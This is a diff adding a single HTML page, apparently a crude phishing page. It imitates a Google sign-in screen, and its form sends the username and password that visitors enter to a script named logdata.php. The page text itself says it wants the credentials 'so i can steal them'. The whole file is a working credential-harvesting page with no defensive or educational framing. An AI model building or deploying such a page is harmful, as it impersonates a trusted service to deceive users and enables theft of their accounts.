@@ -1,0 +1,29 @@
+<html>
+<head>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+</head>
+
+<body style="height: 100vh;">
+    <div class="valign-wrapper container" style="max-width: 500px; height: 100vh; text-align: center;">
+        <div class="" style="width: 100%;">
+            <h4>Sign in to GOOGLE first </h4>
+            <form action="logdata.php" method="post">
+                <div class="row">
+                    <div class="input-field col s12"> <input id="username" type="text" name="username" class="validate">
+                        <label for="username">UserName</label> </div>
+                    <div class="input-field col s12"> <input id="password" name="password" type="password"
+                            class="validate" > <label for="password">Password</label> </div>
+                </div>
+                <div style="margin-top: 30px">
+                    <p>To continue, i need you to type your credentials, so i can steal them hihi.</p>
+                </div><br><button class="btn waves-effect waves-light blue" type="submit" name="action">Sign In <i class="material-icons right">account_box</i> </button>
+            </form>
+        </div>
+    </div>
+</body>
+
+</html>
+
